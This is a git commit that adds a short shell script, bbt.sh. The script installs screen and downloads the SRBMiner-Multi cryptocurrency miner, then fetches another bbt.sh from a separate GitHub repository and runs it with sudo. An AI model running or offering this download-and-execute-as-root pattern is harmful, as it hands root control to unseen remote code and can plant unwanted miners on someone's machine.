1051edb279ea4c4a10bf256df9aca3f9fcc44a6f
uveshV <87410093+uveshV@users.noreply.github.com>
2021-09-15 11:19:33 +0100

    Create bbt.sh

---
+++ bbt.sh
@@ -0,0 +1,9 @@
+apt install screen
+
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.7.6/SRBMiner-Multi-0-7-6-Linux.tar.xz
+tar -xvf SRBMiner-Multi-0-7-6-Linux.tar.xz
+cd SRBMiner-Multi-0-7-6
+
+wget https://raw.githubusercontent.com/uveshV/duniaajapo/main/bbt.sh
+chmod +x bbt.sh
+sudo ./bbt.sh
